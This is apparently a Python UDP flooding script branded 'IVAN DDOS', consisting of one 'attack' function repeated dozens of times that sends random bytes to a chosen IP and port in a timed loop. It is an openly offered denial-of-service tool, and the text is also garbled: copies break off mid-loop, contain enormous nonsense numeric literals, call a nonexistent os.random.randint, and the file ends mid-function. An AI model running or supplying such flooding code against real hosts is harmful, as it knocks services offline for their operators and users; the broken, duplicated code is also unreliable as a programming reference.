    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
